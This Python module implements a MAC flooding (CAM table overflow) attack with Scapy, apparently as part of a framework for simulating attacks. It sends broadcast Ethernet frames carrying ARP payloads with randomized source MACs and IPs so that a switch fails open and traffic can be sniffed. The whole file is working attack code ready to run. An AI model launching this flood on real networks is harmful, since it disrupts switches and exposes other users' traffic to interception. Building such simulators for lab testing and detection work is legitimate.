"""MAC Flooding attack module.

Floods the network with Ethernet frames using randomized source MACs
to overflow the switch's CAM (Content Addressable Memory) table.

When the CAM table overflows, many switches "fail open" into hub-like
broadcast mode, allowing the attacker to sniff all traffic on the segment.
"""

import time
from datetime import datetime

from scapy.all import ARP, Ether, RandIP, RandMAC, sendp

from attacks.base import BaseAttack
from common.models import AttackResult


class MACFlood(BaseAttack):
    """MAC flooding (CAM table overflow) attack simulation.

    Each packet uses a unique random source MAC, rapidly filling the
    switch's MAC address table. Scapy's RandMAC() generates a new
    random MAC per packet.
    """

    attack_type = "mac_flood"

    def __init__(self, interface: str = "eth0"):
        """Initialize the MAC flood attack.

        Args:
            interface: Network interface to send packets on.
        """
        self.interface = interface

    def launch(self, count: int = 500, interval: float = 0.001) -> AttackResult:
        """Flood the network with random source MACs.

        Args:
            count: Number of fake MAC frames to send.
            interval: Seconds between each packet (0.001 = 1000 pps).

        Returns:
            AttackResult with attack metadata.
        """
        # Each packet gets a fresh random source MAC via RandMAC()
        # Broadcast destination ensures it reaches the switch
        # ARP request payload gives it a valid L3 structure
        packet = (
            Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
            / ARP(op=1, psrc=RandIP(), pdst=RandIP())
        )

        start_time = datetime.now()
        start = time.monotonic()

        sendp(
            packet,
            count=count,
            inter=interval,
            iface=self.interface,
            verbose=False,
        )

        duration = time.monotonic() - start

        return AttackResult(
            attack_type=self.attack_type,
            packets_sent=count,
            duration_s=duration,
            start_time=start_time,
        )
